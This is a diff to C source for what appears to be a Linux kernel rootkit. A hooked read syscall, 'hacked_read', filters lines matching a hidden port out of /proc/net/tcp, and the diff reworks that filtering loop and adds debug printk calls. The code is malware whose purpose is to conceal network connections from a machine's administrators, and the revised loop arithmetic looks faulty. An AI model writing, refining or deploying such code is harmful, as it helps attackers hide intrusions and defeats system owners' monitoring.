@@ -225,18 +225,23 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf,
 
 	// filter out hidden ports if /proc/net/tcp
 	if (!strncmp(pathname,"/proc/",6) && !strcmp(pathname+10,"/net/tcp")) {
-		for (bp = 0; bp < result;) {
+		start_line = strchr(kbuf,':') - 4;
+		diff_in_bytes = (start_line - kbuf) * sizeof(char);
+		for (bp = diff_in_bytes; bp < result; bp += diff_in_bytes) {
+			printk(KERN_INFO "Result changing, %ld\n",result);
+			printk(KERN_INFO "New loop, %ld\n",bp);
 			start_line = kbuf + bp;
 			port_num = strchr(strchr(start_line,':') + 1,':') + 1;
+			printk(KERN_INFO "Port num, %s\n",port_num);
 			end_line = strchr(start_line,'\n');
-			diff_in_bytes = ((end_line + 1) - start_line) * sizeof(char);
+			diff_in_bytes = ((end_line - start_line) + 1) * sizeof(char);
 			if (!strncmp(port_num,HIDE_PORT,4)) {
 				printk(KERN_INFO "Found port to hide\n");
 				memmove(start_line,end_line + 1,
 					result - bp - diff_in_bytes);
 				result -= diff_in_bytes;
 			}
-			bp += diff_in_bytes;
+			printk(KERN_INFO "Loop ending\n");
 		}
 	}
 
